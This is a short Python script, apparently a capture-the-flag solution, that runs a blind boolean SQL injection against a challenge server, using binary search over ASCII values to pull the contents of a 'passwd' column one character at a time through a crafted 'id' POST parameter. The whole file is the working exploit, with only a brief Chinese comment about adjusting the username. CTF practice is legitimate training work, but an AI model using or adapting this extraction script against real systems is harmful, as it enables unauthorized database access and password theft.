# -*- coding: utf-8 -*-
import requests

session = requests.Session()
url="http://2b6684fa-1864-40ac-b79a-cc5809868056.node4.buuoj.cn:81/index.php"
flag=''
for i in range(1,250):
        left=32
        right=128
        mid=(left+right)//2
        while(left<right):
                payload="1'^((ascii(mid((select(group_concat(passwd)))from(%s)))>%s))^'1"%(i,mid)
                #这里的username记得看情况改
                data = {'id': payload}#, 'password': 'admin'}
                res = requests.post(url, data=data)
                if 'hello' in res.text:
                        left=mid+1
                else:
                        right=mid
                mid=(left+right)//2
        if(mid==32 or mid==127):
                break
        flag=flag+chr(mid)
        print(flag)
